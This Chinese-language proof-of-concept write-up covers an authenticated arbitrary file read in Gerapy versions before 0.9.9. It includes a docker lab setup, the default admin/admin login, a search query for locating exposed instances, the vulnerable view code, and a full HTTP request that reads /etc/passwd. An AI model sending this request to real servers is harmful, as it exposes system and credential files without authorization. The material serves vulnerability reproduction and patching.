# Gerapy project_file_read 后台任意文件读取漏洞

## 漏洞描述

Gerapy 是一款基于 Scrapy、Scrapyd、Django 和 Vue.js 的分布式爬虫管理框架。

Gerapy < 0.9.9 存在任意文件读取漏洞，函数 `project_file_read` 的 `path` 和 `label` 参数可控，经过身份验证的攻击者可以读取任意文件。

参考链接：

- https://github.com/Gerapy/Gerapy/issues/210
- https://github.com/Gerapy/Gerapy/blob/af5657354aa040d5a6b52c91a837f5d63422d6d3/gerapy/server/core/views.py#L548-L561

## 漏洞影响

```
Gerapy < 0.9.9
```

## 网络测绘

```
title="Gerapy"
```

## 环境搭建

docker-compose.yml

```
version: "3.9"

services:

  gerapy:
    image: germey/gerapy:0.9.6
    build: .
    container_name: gerapy
    restart: always
    volumes:
      - gerapy:/home/gerapy
    ports:
      - 8000:8000

volumes:
  gerapy:
```

执行如下命令启动一个 Gerapy 0.9.6 版本的服务器：

```
docker-compose up -d
```

启动完成后，访问 `http://your-ip:8000` 即可查看登录页面，通过默认口令 `admin/admin` 登录后台。

![](Public/Awesome-POC/Web应用漏洞/images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170319239.png)

## 漏洞复现

[漏洞点](https://github.com/Gerapy/Gerapy/blob/af5657354aa040d5a6b52c91a837f5d63422d6d3/gerapy/server/core/views.py#L339) 位于 `gerapy/server/core/views.py`：

```
@api_view(['POST'])
@permission_classes([IsAuthenticated])
def project_file_read(request):
    """
    get content of project file
    :param request: request object
    :return: file content
    """
    if request.method == 'POST':
        data = json.loads(request.body)
        path = join(data['path'], data['label'])
        # binary file
        with open(path, 'rb') as f:
            return HttpResponse(f.read().decode('utf-8'))
```

![](Public/Awesome-POC/Web应用漏洞/images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170104352.png)

构造请求包：

```
POST /api/project/file/read HTTP/1.1
Host: your-ip:8000
Accept: */*
Referer: http://your-ip:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Authorization: Token e8279162677dd4fbfefe352b0f51ea8ad19cace5

{"path":"/etc/","label":"passwd"}
```

![](Public/Awesome-POC/Web应用漏洞/images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170502226.png)

## 漏洞修复

升级至安全版本。
